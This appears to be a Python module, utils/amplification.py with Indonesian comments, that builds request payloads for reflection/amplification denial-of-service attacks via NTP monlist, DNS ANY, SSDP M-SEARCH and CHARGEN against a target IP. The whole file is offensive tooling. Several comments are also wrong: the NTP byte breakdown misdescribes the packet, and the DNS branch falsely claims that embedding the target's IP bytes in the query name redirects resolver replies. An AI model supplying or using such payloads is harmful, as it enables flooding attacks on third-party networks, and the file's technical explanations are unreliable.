# utils/amplification.py
import struct
import socket

def generate_amplification_payload(target_ip, service="ntp"):
    """
    Menghasilkan payload untuk serangan amplifikasi.

    Args:
        target_ip: Alamat IP target (untuk dimasukkan ke dalam payload).
        service: Jenis layanan amplifikasi (ntp, dns, ssdp, ...).

    Returns:
        Bytes: Payload yang akan dikirim ke reflector.
        None: Jika service tidak didukung.
    """
    if service == "ntp":
        # NTP monlist request (sangat umum, tapi sering diblokir)
        # \x17 = Versi 1, Mode Client, VN=3
        # \x00 =  Leap Indicator = unknown, Stratum = unspecified
        # \x03 = Poll interval = 8 (2^8 = 256 detik)
        # \x2a = Precision = -22 (2^-22 detik)
        return b"\x17\x00\x03\x2a" + b"\x00" * 4

    elif service == "dns":
        # DNS ANY request ke domain yang besar (contoh).
        # Target IP dimasukkan *sebagai bagian dari nama domain*
        # untuk mengelabui resolver agar mengirim respons ke target.
        target_bytes = socket.inet_aton(target_ip)
        encoded_target = b""
        for byte in target_bytes:
          encoded_target += bytes([byte])

        return (
            b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"  # Header
            + encoded_target # Target IP yang di-encode
            + b"\x07example\x03com\x00"  # Nama domain
            + b"\x00\xff\x00\x01"         # Type ANY, Class IN
        )

    elif service == "ssdp":
        # SSDP M-SEARCH Request
        return (
            b"M-SEARCH * HTTP/1.1\r\n"
            + b"HOST: 239.255.255.250:1900\r\n"
            + b"MAN: \"ssdp:discover\"\r\n"
            + b"MX: 2\r\n"
            + b"ST: ssdp:all\r\n\r\n"
        )
    elif service == "chargen": # Character Generator Protocol
        # CHARGEN request (port 19)
        return b""  # Kirim paket kosong saja.

    else:
        return None  # Payload kosong jika tidak dikenal